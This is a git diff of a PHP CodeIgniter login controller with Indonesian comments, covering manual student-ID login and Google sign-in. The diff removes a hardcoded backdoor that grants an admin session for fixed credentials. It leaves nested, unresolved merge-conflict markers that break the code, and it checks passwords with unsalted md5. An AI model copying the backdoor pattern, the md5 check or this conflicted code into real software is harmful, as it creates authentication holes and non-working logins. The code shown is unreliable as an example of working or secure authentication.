@@ -18,11 +18,6 @@ class Googlee extends CI_Controller{
 		//untuk login manual
 		if (isset($_POST['NIM'])&&isset($_POST['PASSWD'])){
 
-			if (($_POST['NIM']=="P2SDDYYWAKWAW")&&($_POST['PASSWD']=="FERDIANPENGENBUCIN")) {
-				$this->session->set_userdata("adminnn",true);
-				redirect('wkwkwkwk','refresh');
-			}
-
 			//ambil data dari ketika NIM di trigger
 			$datum = $this->M_Login->Login_Manual($_POST['NIM']);
 			$a = $datum->NIM;
@@ -30,9 +25,14 @@ class Googlee extends CI_Controller{
 			$c = $datum->PASSWORD;
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 
 =======
 >>>>>>> c1ba425b34cef4e2fd81c1c48f1b17427a6673a9
+=======
+			
+
+>>>>>>> parent of 0215b22... Update application/controllers/Propil/Googlee.php
 			//if else ketika dia login pake username atau pake NIM
 			if ( ($_POST['NIM'] == $a || $_POST['NIM'] == $b) && md5($_POST['PASSWD']) == $c) {
 				$this->session->set_userdata('login',true);
@@ -43,12 +43,17 @@ class Googlee extends CI_Controller{
 			}else{
 =======
 			}
+<<<<<<< HEAD
 			else{
 >>>>>>> c1ba425b34cef4e2fd81c1c48f1b17427a6673a9
 				$data['errorr'] = "Username atau password salah";
 				redirect('login?errorr=Username+atau+password+salah');
 			}
 
+=======
+			else
+				redirect('');
+>>>>>>> parent of 0215b22... Update application/controllers/Propil/Googlee.php
 		}
 
 		//bagian dari API google yakni harus dapet code dulu dari request URL di login form
@@ -63,12 +68,7 @@ class Googlee extends CI_Controller{
 
 			//ngecek apakah dia baru pertama atau ngga, kalo baru pertama diarahin ke page validasi untuk masukin username, nim, dkk
 			if ($this->M_Login->cekFirsttime($idGoogle)==null){
-				if (!isset($this->googleplus->getUserInfo()['name'])) {
-					redirect('login?errorr=maaf+hanya+dapat+mendaftar+dengan+akun+google','refresh');
-				}else{
-					redirect('Propil/Googlee/Daftar');
-				}
-				
+				redirect('Propil/Googlee/Daftar');
 			}
 			else {
 				$dataNIM = $this->M_Login->getNimDKK($idGoogle);
@@ -87,7 +87,6 @@ class Googlee extends CI_Controller{
 
 	public function Daftar()
 	{
-		$this->load->library('form_validation');
 
 		if(isset($_SESSION['DataGoogle'])){
 
@@ -126,7 +125,6 @@ class Googlee extends CI_Controller{
 			}
 			else{
 				$dataNIM = $this->M_Login->getNimDKK($_POST['uidd']);
-				$this->session->set_userdata('login',true);
 				$this->session->set_userdata('DataProfile',$dataNIM);
 				redirect('dashboard');
 			}
